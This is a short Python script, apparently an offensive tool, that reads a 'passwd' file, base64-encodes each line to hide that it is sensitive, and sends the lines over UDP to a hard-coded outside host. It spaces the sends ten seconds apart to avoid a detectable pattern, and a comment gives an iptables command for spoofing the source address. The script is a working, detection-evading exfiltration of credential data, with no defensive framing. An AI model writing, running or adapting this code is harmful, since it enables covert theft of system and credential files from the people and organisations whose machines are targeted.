import socket
import time
import base64

# Encode each line with base64 to make it less obvious that it's sensitive info
def encode_data(data):
        data_bytes = data.encode('ascii')
        encoded_msg_bytes = base64.b64encode(data_bytes)
        encoded_msg = encoded_msg_bytes.decode('ascii')
        return encoded_msg


# sudo iptables -A POSTROUTING -t nat -j SNAT --to (IP to spoof) -o (exit interface)
def process_file(target_file):
	with open(target_file) as fp:
		# Each line is one element as we want.
		line_list = fp.read().splitlines()
	
	return line_list

# The ip of the machine/interface
exfil_ip = "192.168.0.70"
# This can be random
exfil_port = 5000
# The file you want to exfil
lines = process_file('passwd')

# Make one socket only 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
for line in lines:
        # Four our reference within an encrypted line
        print(line)
        # We send this over socket
        base64_line = encode_data(line)
	# Send this data through the wire as bytes and catch it on the other end with sniffer.
        sock.sendto(bytes(base64_line, "utf-8"), (exfil_ip, exfil_port))
	# Randomise these to prevent a steady pattern of data, might look suss.
        time.sleep(10)

"""
UDP_IP = "192.168.0.70"
UDP_PORT = 5000
MESSAGE = "Hello, World!"

print("UDP target IP:", UDP_IP)
#print("UDP target port:", UDP_PORT)
print("message:", MESSAGE)

# We only want one of these socekts. 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
sock.sendto(bytes(MESSAGE, "utf-8"), (UDP_IP, UDP_PORT))
"""
